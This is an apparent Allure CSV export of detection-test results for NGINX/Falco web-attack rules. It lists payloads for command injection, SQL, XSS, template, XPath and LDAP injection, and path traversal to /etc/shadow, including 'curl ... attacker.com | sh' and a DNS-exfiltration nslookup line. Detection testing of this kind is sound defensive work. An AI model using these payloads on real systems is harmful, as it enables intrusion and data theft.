"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_004` |
| **Name** | DNS-based data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; nslookup `whoami`.attacker.com`
- **Encoded**: `%3B%20nslookup%20%60whoami%60.attacker.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 12:09:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1769861365361-px2hv pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1769861365361-px2hv pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1

**Falco Log Entry**:
```
12:09:25.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1769861365361-px2hv pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
```","2","test_e2e_with_logs[297_CMD_BLIND_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENV_002` |
| **Name** | LD_PRELOAD injection |
| **Category** | CMDINJ |
| **Subcategory** | env_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `LD_PRELOAD=/tmp/evil.so /bin/id`
- **Encoded**: `LD_PRELOAD%3D%2Ftmp%2Fevil.so%20%2Fbin%2Fid`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 12:09:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_002-1769861373377-5n7xjd pattern_id=CMD_ENV_002 uri=/?q=LD_PRELOAD%3D%2Ftmp%2Fevil.so%20%2Fbin%2Fid client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_002-1769861373377-5n7xjd pattern_id=CMD_ENV_002 uri=/?q=LD_PRELOAD%3D%2Ftmp%2Fevil.so%20%2Fbin%2Fid client=127.0.0.1

**Falco Log Entry**:
```
12:09:33.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_002-1769861373377-5n7xjd pattern_id=CMD_ENV_002 uri=/?q=LD_PRELOAD%3D%2Ftmp%2Fevil.so%20%2Fbin%2Fid client=127.0.0.1
```","1","test_e2e_with_logs[306_CMD_ENV_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_001` |
| **Name** | Command substitution with whoami |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(whoami)`
- **Encoded**: `%24%28whoami%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 12:09:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_SUB_001-1769861366363-m7n78vn pattern_id=CMD_SUB_001 uri=/?q=%24%28whoami%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_001-1769861366363-m7n78vn pattern_id=CMD_SUB_001 uri=/?q=%24%28whoami%29 client=127.0.0.1

**Falco Log Entry**:
```
12:09:26.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_001-1769861366363-m7n78vn pattern_id=CMD_SUB_001 uri=/?q=%24%28whoami%29 client=127.0.0.1
```","1","test_e2e_with_logs[325_CMD_SUB_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_007` |
| **Name** | Window.location DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `window.location='javascript:alert(""DOM"")'`
- **Encoded**: `window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 12:09:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_007-1769861357365-kt9zis pattern_id=XSS_DOM_007 uri=/?q=window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_007-1769861357365-kt9zis pattern_id=XSS_DOM_007 uri=/?q=window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:17.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_007-1769861357365-kt9zis pattern_id=XSS_DOM_007 uri=/?q=window.location%3D%27javascript%3Aalert%28%22DOM%22%29%27 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[136_XSS_DOM_007]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_PEBBLE_001` |
| **Name** | Pebble command execution |
| **Category** | SSTI |
| **Subcategory** | pebble |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{% set cmd = ""id"" %}{{ system(cmd) }}`
- **Encoded**: `%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 12:09:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1769861384339-ofsur pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1769861384339-ofsur pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
12:09:44.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1769861384339-ofsur pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1
```","1","test_e2e_with_logs[389_SSTI_PEBBLE_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_POLY_004` |
| **Name** | MySQL polyglot version extraction |
| **Category** | SQLI |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1'+(select*from(select name_const(@@version,0))a)+'1`
- **Encoded**: `1%27%2B%28select%2Afrom%28select%20name_const%28%40%40version%2C0%29%29a%29%2B%271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 12:09:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_POLY_004-1769861384432-3czwde pattern_id=SQLI_POLY_004 uri=/?q=1%27%2B%28select%2Afrom%28select%20name_const%28%40%40version%2C0%29%29a%29%2B%271 client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_POLY_004-1769861384432-3czwde pattern_id=SQLI_POLY_004 uri=/?q=1%27%2B%28select%2Afrom%28select%20name_const%28%40%40version%2C0%29%29a%29%2B%271 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:44.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_POLY_004-1769861384432-3czwde pattern_id=SQLI_POLY_004 uri=/?q=1%27%2B%28select%2Afrom%28select%20name_const%28%40%40version%2C0%29%29a%29%2B%271 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[076_SQLI_POLY_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_005` |
| **Name** | Extended sleep duration |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP(10)`
- **Encoded**: `SLEEP%2810%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 12:08:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_005-1769861338334-70ibtj pattern_id=SQLI_TIME_005 uri=/?q=SLEEP%2810%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_005-1769861338334-70ibtj pattern_id=SQLI_TIME_005 uri=/?q=SLEEP%2810%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:08:58.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_005-1769861338334-70ibtj pattern_id=SQLI_TIME_005 uri=/?q=SLEEP%2810%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[088_SQLI_TIME_005]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_065` |
| **Name** | JavaScript Protocol Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `javascript:alert(1)`
- **Encoded**: `javascript%3Aalert%281%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 12:09:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1769861373402-s4sn2k pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1769861373402-s4sn2k pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:33.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1769861373402-s4sn2k pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[118_XSS_ADV_065]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_001` |
| **Name** | Basic script tag XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<script>alert('XSS')</script>`
- **Encoded**: `%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 12:09:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] XSS Filter Bypass Attempt` |
| **Matched Rule** | `[NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1769861341329-idciw pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1769861341329-idciw pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:01.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1769861341329-idciw pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[166_XSS_REFL_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_004` |
| **Name** | URL encoded command substitution |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%24%28whoami%29`
- **Encoded**: `%2524%2528whoami%2529`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~29000ms
- **Timestamp**: 12:09:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_004-1769861369870-yuqvpy pattern_id=CMD_ENC_004 uri=/?q=%2524%2528whoami%2529 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_004-1769861369870-yuqvpy pattern_id=CMD_ENC_004 uri=/?q=%2524%2528whoami%2529 client=127.0.0.1

**Falco Log Entry**:
```
12:09:29.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_004-1769861369870-yuqvpy pattern_id=CMD_ENC_004 uri=/?q=%2524%2528whoami%2529 client=127.0.0.1
```","2","test_e2e_with_logs[302_CMD_ENC_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_011` |
| **Name** | Audio onerror XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<audio src=x onerror=alert('XSS')>`
- **Encoded**: `%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~52000ms
- **Timestamp**: 12:09:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1769861346341-erygad pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1769861346341-erygad pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:06.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1769861346341-erygad pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[176_XSS_REFL_011]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_002` |
| **Name** | Shadow file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../etc/shadow`
- **Encoded**: `../../etc/shadow`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 12:09:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1769861349338-wblgy pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1769861349338-wblgy pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1

**Falco Log Entry**:
```
12:09:09.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_002-1769861349338-wblgy pattern_id=PATH_DOT_002 uri=/?q=../../etc/shadow client=127.0.0.1
```","1","test_e2e_with_logs[220_PATH_DOT_002]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_ENUM_001` |
| **Name** | XPath string-length enumeration |
| **Category** | XPATH |
| **Subcategory** | enumeration |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or string-length(//user[1]/password)>5 or '1'='2`
- **Encoded**: `%27%20or%20string-length%28%2F%2Fuser%5B1%5D%2Fpassword%29%3E5%20or%20%271%27%3D%272`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 12:09:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_ENUM_001-1769861378334-h931bv pattern_id=XPATH_ENUM_001 uri=/?q=%27%20or%20string-length%28%2F%2Fuser%5B1%5D%2Fpassword%29%3E5%20or%20%271%27%3D%272 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_ENUM_001-1769861378334-h931bv pattern_id=XPATH_ENUM_001 uri=/?q=%27%20or%20string-length%28%2F%2Fuser%5B1%5D%2Fpassword%29%3E5%20or%20%271%27%3D%272 client=127.0.0.1

**Falco Log Entry**:
```
12:09:38.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_ENUM_001-1769861378334-h931bv pattern_id=XPATH_ENUM_001 uri=/?q=%27%20or%20string-length%28%2F%2Fuser%5B1%5D%2Fpassword%29%3E5%20or%20%271%27%3D%272 client=127.0.0.1
```","1","test_e2e_with_logs[365_XPATH_ENUM_001]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_004` |
| **Name** | LDAP email domain enumeration |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `*)(mail=*@company.com)`
- **Encoded**: `*)(mail%3D*%40company.com)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 12:09:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_004-1769861365340-j6sizi pattern_id=LDAP_BLIND_004 uri=/?q=*)(mail%3D*%40company.com) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_004-1769861365340-j6sizi pattern_id=LDAP_BLIND_004 uri=/?q=*)(mail%3D*%40company.com) client=127.0.0.1

**Falco Log Entry**:
```
12:09:25.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_004-1769861365340-j6sizi pattern_id=LDAP_BLIND_004 uri=/?q=*)(mail%3D*%40company.com) client=127.0.0.1
```","2","test_e2e_with_logs[346_LDAP_BLIND_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_004` |
| **Name** | Remote script execution via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``curl -s http://attacker.com | sh``
- **Encoded**: `%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~13000ms
- **Timestamp**: 12:09:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via backtick` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1769861385908-nsel2x pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1769861385908-nsel2x pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:45.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1769861385908-nsel2x pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[267_CMD_BACK_004]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_091` |
| **Name** | PostgreSQL pg_sleep |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `pg_sleep(5)`
- **Encoded**: `pg_sleep%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~17000ms
- **Timestamp**: 12:09:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ADV_091-1769861381424-5rpdm5 pattern_id=SQLI_ADV_091 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ADV_091-1769861381424-5rpdm5 pattern_id=SQLI_ADV_091 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
12:09:41.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ADV_091-1769861381424-5rpdm5 pattern_id=SQLI_ADV_091 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[017_SQLI_ADV_091]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_003` |
| **Name** | OR operator with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|| id`
- **Encoded**: `%7C%7C%20id`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 12:09:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1769861352332-rraqd7 pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1769861352332-rraqd7 pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1

**Falco Log Entry**:
```
12:09:12.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1769861352332-rraqd7 pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1
```","1","test_e2e_with_logs[275_CMD_BASIC_003]","allure","2026-01-31","passed","2026-01-31","","test_e2e_wrapper","",""
